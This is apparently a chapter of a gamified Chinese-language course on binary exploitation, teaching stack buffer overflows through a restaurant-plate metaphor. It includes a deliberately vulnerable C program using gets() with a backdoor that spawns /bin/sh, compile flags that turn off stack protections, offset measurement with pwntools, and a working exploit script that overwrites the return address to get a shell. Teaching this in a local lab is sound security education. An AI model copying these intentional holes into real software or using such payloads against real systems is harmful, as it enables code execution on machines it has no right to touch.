# 第 7 关 · 栈溢出：往盘子里堆太多菜

## 🎬 游戏开场

回到餐厅那个盘子柱。这次你发现一个 BUG：

有个新厨师端来一个盘子，说"请往这个盘子里放菜"，但他**没规定你能放多少**。于是你不停地放、放、放——菜堆出了盘子边缘，压到下面的盘子，把写着"回城卷轴"的那张纸条**涂改成了你自己的字**。

等这个任务结束时，游戏按照"回城卷轴"上的地址传送——结果去了你写的地址。

**恭喜，你刚刚完成了人生第一次栈溢出攻击。**

---

## 🧠 核心概念（游戏版）

### 1. 漏洞从哪来：不设限的容器

看这段 C 代码：

```c
void vulnerable() {
    char buf[16];   // 一个只能装16个字母的盘子
    gets(buf);      // 但厨师问都不问就往里倒，倒多少都行
}
```

`gets()` 是个臭名昭著的函数：它一直读输入直到换行，**完全不检查 `buf` 够不够大**。这就是"没规定能放多少"的盘子。

还有这些"危险厨师"：

| 危险函数 | 问题 |
| --- | --- |
| `gets()` | 完全不检查长度 |
| `strcpy()` | 复制时不知道目标大小 |
| `sprintf()` | 格式化写入不检查长度 |
| `scanf("%s")` | 不限制字符串长度 |

它们的共同特点：**写入的数据量由"输入"决定，而不是由"容器大小"决定**。多出来的数据就会溢出到相邻内存。

### 2. 溢出会覆盖什么？

栈上的布局（从低地址往高地址）：

```
低地址
  ┌──────────────────┐
  │  buf[16]          │ ← 你的输入从这里开始写
  │  (16字节)         │
  ├──────────────────┤
  │  旧的 rbp         │ ← 继续往上写，先覆盖它
  ├──────────────────┤
  │  返回地址         │ ← 再往上，就是回城卷轴！
  ├──────────────────┤
  │  调用者的栈帧...   │
高地址
```

当你输入超过 16 字节，数据像水一样往高地址漫：

- 前 16 字节：正常填满 buf。
- 接下来 8 字节：覆盖旧的 rbp。
- 再接下来 8 字节：**覆盖返回地址**！

> 🎮 **关键点**：x86-64 上，返回地址是 8 字节。我们要精确控制"填多少个垃圾字节才能刚好到返回地址"，这个数量叫**偏移（offset）**。

### 3. 计算偏移：找到"回城卷轴"在哪

怎么知道要填多少字节？三种方法：

**方法一：看反汇编**

```bash
objdump -d -M intel ./vuln | grep -A10 "<vulnerable>"
```

如果看到 `sub rsp, 0x10`，说明 buf 附近留了 16 字节空间。还要加上保存的 rbp（8字节），所以偏移通常是 `16 + 8 = 24`。但要实际验证。

**方法二：gdb 测量（最靠谱）**

用模式字符串（cyclic pattern）找到崩溃时的精确位置：

```bash
# 生成 pattern
python3 -c "from pwn import *; print(cyclic(100))"

# 在 gdb 里运行，输入这个 pattern，崩溃后看 rsp/rip
gdb ./vuln
(gdb) run < <(python3 -c "from pwn import *; print(cyclic(100))")
# 崩溃后
(gdb) cyclic_find($rsp)   # 或者看 rip 的值
```

pwntools 的 `cyclic(100)` 生成一串不会重复的字符，崩溃时 RIP 或 RSP 里会留下其中 4/8 字节，`cyclic_find` 一算就知道偏移。

**方法三：直接试**

从 0 开始递增填充长度，看程序在哪崩溃——笨但有效（不过 pattern 更优雅）。

### 4. 构造 payload：作弊码的结构

一旦知道偏移（假设 24），payload 长这样：

```
payload = b"A" * 24          # 填满buf + 覆盖rbp
        + p64(目标地址)       # 覆盖返回地址 → 跳到这里
```

`p64()` 是 pwntools 的函数，把一个数字打包成 8 字节（小端序）——正好对应"藏宝图底朝前放"的规则。

**这个 payload 就是你的作弊码。** 程序一 `ret`，就跳到"目标地址"。

目标地址填什么？看下一关 ret2text——先拿程序里现成的后门函数开刀。

## 🔧 真实世界对照

| 游戏说法 | 真实术语 |
| --- | --- |
| 堆菜的盘子 | 栈上的局部数组 `buf` |
| 没设限的厨师 | `gets` / `strcpy` 等不安全函数 |
| 涂改回城卷轴 | 覆盖返回地址 |
| 要填多少字节 | 偏移（offset） |
| 作弊码 | payload |
| 目标地址 | 你想让 rip 跳去的地方 |

**为什么叫"栈溢出"？** 因为数据从局部变量向栈的高地址"溢出"，像水漫过容器。英文 stack overflow，也正好是程序员论坛的名字。

## 🎯 闯关任务：打出你的第一击

先写一个有漏洞的程序并关掉保护（新手福利关）：

```c
// vuln.c
#include <stdio.h>
void backdoor() {
    system("/bin/sh");   // 隐藏关卡：直接给shell
}
void vulnerable() {
    char buf[16];
    puts("输入点什么：");
    gets(buf);           // 危险！
    puts("收到。");
}
int main() { vulnerable(); return 0; }
```

```bash
gcc -g -O0 -fno-stack-protector -no-pie vuln.c -o vuln
```

**第一步：找 backdoor 地址**

```bash
nm vuln | grep backdoor
# 输出类似：0000000000401176 T backdoor
```

记下那个 `0x401176`（你的机器可能不同）。

**第二步：测偏移**

```bash
python3 -c "from pwn import *; print(cyclic(50))" | ./vuln
```

程序会崩溃。用 gdb 找到崩溃时的偏移（方法见上文），或直接猜 `16+8=24`。

**第三步：写 exp**

```python
# exp.py
from pwn import *

context.binary = './vuln'
p = process('./vuln')

ret_addr = 0x401176        # 换成你机器上 backdoor 的地址
offset = 24

payload = b'A' * offset + p64(ret_addr)
p.sendline(payload)
p.interactive()            # 如果成功，你会得到一个 shell！
```

运行 `python3 exp.py`，如果看到 `$` 提示符，输入 `whoami` 有反应——**恭喜，你通关了第 7 关，拿到了第一个 shell！**

> 如果失败：检查偏移是否正确（用 gdb 确认）、地址是否正确（每次编译都变）、是否忘了 `-no-pie`。

## 📌 本关小结

| 你学会了 | 一句话记忆 |
| --- | --- |
| 栈溢出 | 输入超过容器，漫上栈覆盖返回地址 |
| 危险函数 | gets/strcpy 等不检查长度的函数 |
| 偏移 | 从输入起点到返回地址的字节数 |
| cyclic pattern | 自动测偏移的神器 |
| payload | 填充物 + p64(目标地址) |

**这是全书最重要的一关。** 你第一次把"概念"变成了"能打通的程序"。后面所有栈利用，都是这一关的变体：换目标地址、绕过保护、精确构造。
